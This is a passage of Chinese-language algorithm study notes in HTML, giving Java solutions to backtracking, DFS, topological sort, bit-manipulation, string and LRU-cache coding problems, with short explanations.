class="hljs-keyword">int</span> index, Map&lt;Character, String&gt; phoneMap)</span></span>&#123;<br><br>    <span class="hljs-keyword">if</span>(index == digits.length())&#123;<br>        String s = track.toString();<br>        res.add(s);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    String s = phoneMap.get(digits.charAt(index));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.length(); i++)&#123;<br>        track.append(s.charAt(i));<br>        backtrack(res, track, digits, index + <span class="hljs-number">1</span>, phoneMap);<br>        track.deleteCharAt(track.length() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-5-组合总和"><a href="#7-5-组合总和" class="headerlink" title="7.5 组合总和"></a>7.5 组合总和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; combinationSum(<span class="hljs-keyword">int</span>[] candidates, <span class="hljs-keyword">int</span> target) &#123;<br>    List&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    backtrack(candidates, target, track, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] candidates, <span class="hljs-keyword">int</span> target, List&lt;Integer&gt; track, <span class="hljs-keyword">int</span> index)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(index == candidates.length)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(target == <span class="hljs-number">0</span>)&#123;<br>        res.add(<span class="hljs-keyword">new</span> LinkedList&lt;Integer&gt;(track));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//不选当前数</span><br>    backtrack(candidates, target, track, index + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//选择当前数，需要判断+回溯</span><br>    <span class="hljs-keyword">if</span>(target - candidates[index] &gt;= <span class="hljs-number">0</span>)&#123;<br>        track.add(candidates[index]);<br>        backtrack(candidates, target - candidates[index], track, index);<br>        track.remove(track.size() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-6-单词搜索"><a href="#7-6-单词搜索" class="headerlink" title="7.6 单词搜索"></a>7.6 单词搜索</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">exist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board, String word)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; board.length; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; board[<span class="hljs-number">0</span>].length; j++)&#123;<br>            <span class="hljs-keyword">if</span>(dfs(board, word, <span class="hljs-number">0</span>, i, j))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>  <span class="hljs-keyword">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board, String word, <span class="hljs-keyword">int</span> index, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span></span>&#123;<br><br>    <span class="hljs-keyword">if</span>(index == word.length())&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(i &gt;= board.length || i &lt; <span class="hljs-number">0</span> || j &gt;= board[<span class="hljs-number">0</span>].length <br>    || j &lt; <span class="hljs-number">0</span>|| board[i][j] != word.charAt(index))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(board[i][j] == word.charAt(index))&#123;<br>        <span class="hljs-keyword">char</span> tmp = board[i][j];<br>        <span class="hljs-comment">//选择</span><br>        board[i][j] = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-comment">//递归</span><br>        <span class="hljs-keyword">if</span>(dfs(board, word, index + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>, j) || dfs(board, word, index + <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>, j)<br>        || dfs(board, word, index + <span class="hljs-number">1</span>, i, j + <span class="hljs-number">1</span>) ||  dfs(board, word, index + <span class="hljs-number">1</span>, i, j - <span class="hljs-number">1</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        board[i][j] = tmp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-7-岛屿数量"><a href="#7-7-岛屿数量" class="headerlink" title="7.7 岛屿数量"></a>7.7 岛屿数量</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] grid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = grid.length, n = grid[<span class="hljs-number">0</span>].length;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)&#123;<br>            <span class="hljs-keyword">if</span>(dfs(grid, i, j))&#123;<br>                res++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] grid, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">0</span> || i &gt;= grid.length || j &lt; <span class="hljs-number">0</span> || j &gt;= grid[<span class="hljs-number">0</span>].length || grid[i][j] == <span class="hljs-string">&#x27;0&#x27;</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    grid[i][j] = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    dfs(grid, i + <span class="hljs-number">1</span>, j);<br>    dfs(grid, i - <span class="hljs-number">1</span>, j);<br>    dfs(grid, i, j + <span class="hljs-number">1</span>);<br>    dfs(grid, i, j - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-8-课程表"><a href="#7-8-课程表" class="headerlink" title="7.8 课程表"></a>7.8 课程表</h2><p>我们可以将深度优先搜索的流程与拓扑排序的求解联系起来，用一个栈来存储所有已经搜索完成的节点。</p><p>对于一个节点 u，如果它的所有相邻节点都已经搜索完成，那么在搜索回溯到 u 的时候，u 本身也会变成一个已经搜索完成的节点。这里的「相邻节点」指的是从 u 出发通过一条有向边可以到达的所有节点。</p><p>假设我们当前搜索到了节点 u，如果它的所有相邻节点都已经搜索完成，那么这些节点都已经在栈中了，此时我们就可以把 u 入栈。可以发现，如果我们从栈顶往栈底的顺序看，由于 u 处于栈顶的位置，那么 u 出现在所有 u 的相邻节点的前面。因此对于 u 这个节点而言，它是满足拓扑排序的要求的。</p><p>这样以来，我们对图进行一遍深度优先搜索。当每个节点进行回溯的时候，我们把该节点放入栈中。最终从栈顶到栈底的序列就是一种拓扑排序。</p><p>算法</p><p>对于图中的任意一个节点，它在搜索的过程中有三种状态，即：</p><ul><li>「未搜索」：我们还没有搜索到这个节点；</li><li>「搜索中」：我们搜索过这个节点，但还没有回溯到该节点，即该节点还没有入栈，还有相邻的节点没有搜索完成）；</li><li>「已完成」：我们搜索过并且回溯过这个节点，即该节点已经入栈，并且所有该节点的相邻节点都出现在栈的更底部的位置，满足拓扑排序的要求。</li></ul><p>通过上述的三种状态，我们就可以给出使用深度优先搜索得到拓扑排序的算法流程，在每一轮的搜索搜索开始时，我们任取一个「未搜索」的节点开始进行深度优先搜索。</p><p>我们将当前搜索的节点 u 标记为「搜索中」，遍历该节点的每一个相邻节点 v：</p><p>如果 v为「未搜索」，那么我们开始搜索 v，待搜索完成回溯到 u；</p><p>如果 v 为「搜索中」，那么我们就找到了图中的一个环，因此是不存在拓扑排序的；</p><p>如果 v 为「已完成」，那么说明 v 已经在栈中了，而 u 还不在栈中，因此 u 无论何时入栈都不会影响到 (u,v) 之前的拓扑关系，以及不用进行任何操作。</p><p>当 u 的所有相邻节点都为「已完成」时，我们将 u 放入栈中，并将其标记为「已完成」。</p><p>在整个深度优先搜索的过程结束后，如果我们没有找到图中的环，那么栈中存储这所有的 n 个节点，从栈顶到栈底的顺序即为一种拓扑排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-comment">//edges是邻接表</span><br>List&lt;List&lt;Integer&gt;&gt; edges;<br>   <span class="hljs-keyword">int</span>[] visited;<br>   <span class="hljs-keyword">boolean</span> valid = <span class="hljs-keyword">true</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canFinish</span><span class="hljs-params">(<span class="hljs-keyword">int</span> numCourses, <span class="hljs-keyword">int</span>[][] prerequisites)</span> </span>&#123;<br>       edges = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; numCourses; i++)&#123;<br>           edges.add(<span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;());<br>       &#125;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num[] : prerequisites)&#123;<br>           edges.get(num[<span class="hljs-number">1</span>]).add(num[<span class="hljs-number">0</span>]);<br>       &#125;<br>       visited = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[numCourses];<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; numCourses &amp;&amp; valid; i++)&#123;<br>           <span class="hljs-keyword">if</span>(visited[i] == <span class="hljs-number">0</span>)&#123;<br>               dfs(i);<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> valid;<br>   &#125;<br>   <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k)</span></span>&#123;<br>       visited[k] = <span class="hljs-number">1</span>;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i : edges.get(k))&#123;<br>           <span class="hljs-keyword">if</span>(visited[i] == <span class="hljs-number">0</span>)&#123;<br>               dfs(i);<br>               <span class="hljs-keyword">if</span>(!valid)&#123;<br>                   <span class="hljs-keyword">return</span>;<br>               &#125;<br>           &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(visited[i] == <span class="hljs-number">1</span>)&#123;<br>               valid = <span class="hljs-keyword">false</span>;<br>               <span class="hljs-keyword">return</span>;<br>           &#125;<br>       &#125;<br>       visited[k] = <span class="hljs-number">2</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure><h2 id="7-9-删除无效括号"><a href="#7-9-删除无效括号" class="headerlink" title="7.9 删除无效括号"></a>7.9 删除无效括号</h2><p>先遍历计算出需要删除得左括号和右括号个数，再递归尝试可能得结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> len;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">char</span>[] charArray;<br>    <span class="hljs-keyword">private</span> Set&lt;String&gt; validExpressions = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">removeInvalidParentheses</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.len = s.length();<br>        <span class="hljs-keyword">this</span>.charArray = s.toCharArray();<br><br>        <span class="hljs-comment">// 第 1 步：遍历一次，计算多余的左右括号</span><br>        <span class="hljs-keyword">int</span> leftRemove = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> rightRemove = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            <span class="hljs-keyword">if</span> (charArray[i] == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>                leftRemove++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (charArray[i] == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                <span class="hljs-comment">// 遇到右括号的时候，须要根据已经存在的左括号数量决定</span><br>                <span class="hljs-keyword">if</span> (leftRemove == <span class="hljs-number">0</span>) &#123;<br>                    rightRemove++;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (leftRemove &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// 关键：一个右括号出现可以抵销之前遇到的左括号</span><br>                    leftRemove--;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 第 2 步：回溯算法，尝试每一种可能的删除操作</span><br>        StringBuilder path = <span class="hljs-keyword">new</span> StringBuilder();<br>        dfs(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, leftRemove, rightRemove, path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;&gt;(<span class="hljs-keyword">this</span>.validExpressions);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> index       当前遍历到的下标</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> leftCount   已经遍历到的左括号的个数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> rightCount  已经遍历到的右括号的个数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> leftRemove  最少应该删除的左括号的个数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> rightRemove 最少应该删除的右括号的个数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> path        一个可能的结果</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index, <span class="hljs-keyword">int</span> leftCount, <span class="hljs-keyword">int</span> rightCount, <span class="hljs-keyword">int</span> leftRemove, <span class="hljs-keyword">int</span> rightRemove, StringBuilder path)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index == len) &#123;<br>            <span class="hljs-keyword">if</span> (leftRemove == <span class="hljs-number">0</span> &amp;&amp; rightRemove == <span class="hljs-number">0</span>) &#123;<br>                validExpressions.add(path.toString());<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">char</span> character = charArray[index];<br>        <span class="hljs-comment">// 可能的操作 1：删除当前遍历到的字符</span><br>        <span class="hljs-keyword">if</span> (character == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; leftRemove &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 由于 leftRemove &gt; 0，并且当前遇到的是左括号，因此可以尝试删除当前遇到的左括号</span><br>            dfs(index + <span class="hljs-number">1</span>, leftCount, rightCount, leftRemove - <span class="hljs-number">1</span>, rightRemove, path);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (character == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; rightRemove &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 由于 rightRemove &gt; 0，并且当前遇到的是右括号，因此可以尝试删除当前遇到的右括号</span><br>            dfs(index + <span class="hljs-number">1</span>, leftCount, rightCount, leftRemove, rightRemove - <span class="hljs-number">1</span>, path);<br>        &#125;<br><br>        <span class="hljs-comment">// 可能的操作 2：保留当前遍历到的字符</span><br>        <span class="hljs-comment">// 做选择</span><br>        path.append(character);<br>        <span class="hljs-comment">//递归</span><br>        <span class="hljs-keyword">if</span> (character != <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; character != <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 如果不是括号，继续深度优先遍历</span><br>            dfs(index + <span class="hljs-number">1</span>, leftCount, rightCount, leftRemove, rightRemove, path);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (character == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 考虑左括号</span><br>            dfs(index + <span class="hljs-number">1</span>, leftCount + <span class="hljs-number">1</span>, rightCount, leftRemove, rightRemove, path);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rightCount &lt; leftCount) &#123;<br>            <span class="hljs-comment">// 考虑右括号</span><br>            dfs(index + <span class="hljs-number">1</span>, leftCount, rightCount + <span class="hljs-number">1</span>, leftRemove, rightRemove, path);<br>        &#125;<br>        <span class="hljs-comment">//撤销选择</span><br>        path.deleteCharAt(path.length() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-位运算"><a href="#8-位运算" class="headerlink" title="8. 位运算"></a>8. 位运算</h1><h2 id="8-1-只出现一次的数字"><a href="#8-1-只出现一次的数字" class="headerlink" title="8.1 只出现一次的数字"></a>8.1 只出现一次的数字</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        res ^= num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-2-汉明距离"><a href="#8-2-汉明距离" class="headerlink" title="8.2 汉明距离"></a>8.2 汉明距离</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hammingDistance</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> z = x ^ y;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(z != <span class="hljs-number">0</span>)&#123;<br>        z = z &amp; (z - <span class="hljs-number">1</span>);<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-字符串"><a href="#9-字符串" class="headerlink" title="9. 字符串"></a>9. 字符串</h1><h2 id="9-1-字母异位词分组"><a href="#9-1-字母异位词分组" class="headerlink" title="9.1 字母异位词分组"></a>9.1 字母异位词分组</h2><p>ArrayList构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList(Collection&lt;? extends E&gt; c)<br>构造一个包含指定 collection 的元素的列表，这些元素是按照该 collection 的迭代器返回它们的顺序排列的。<br></code></pre></td></tr></table></figure><p>HashMap values方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Collection&lt;V&gt; <span class="hljs-title">values</span><span class="hljs-params">()</span></span><br><span class="hljs-function">返回此映射所包含的值的 Collection 视图。</span><br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;<br>    HashMap&lt;String, List&lt;String&gt;&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-keyword">for</span>(String str : strs)&#123;<br>        <span class="hljs-keyword">char</span>[] array = str.toCharArray();<br>        Arrays.sort(array);<br>        String key = <span class="hljs-keyword">new</span> String(array);<br>        List&lt;String&gt; list = map.getOrDefault(key, <span class="hljs-keyword">new</span> LinkedList&lt;String&gt;());<br>        list.add(str);<br>        map.put(key, list);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;List&lt;String&gt;&gt;(map.values());<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="10-设计"><a href="#10-设计" class="headerlink" title="10. 设计"></a>10. 设计</h1><h2 id="10-1-LRU缓存机制"><a href="#10-1-LRU缓存机制" class="headerlink" title="10.1 LRU缓存机制"></a>10.1 LRU缓存机制</h2><p>LRU算法的实现依赖于LinkedListHashMap的结构，要明白为什么使用LinkedHashMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> cap;<br>LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="hljs-keyword">new</span> LinkedHashMap&lt;&gt;();<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LRUCache</span><span class="hljs-params">(<span class="hljs-keyword">int</span> capacity)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.cap = capacity;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!cache.containsKey(key)) &#123;<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 将 key 变为最近使用</span><br>    makeRecently(key);<br>    <span class="hljs-keyword">return</span> cache.get(key);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(cache.containsKey(key))&#123;<br>        cache.put(key, value);<br>        makeRecently(key);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cache.size() &gt;= <span class="hljs-keyword">this</span>.cap)&#123;<br>        <span class="hljs-comment">//删除最久未使用元素</span><br>        <span class="hljs-keyword">int</span> oldKey = cache.keySet().iterator().next();<br>        cache.remove(oldKey);<br>    &#125;<br>    cache.put(key, value);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span 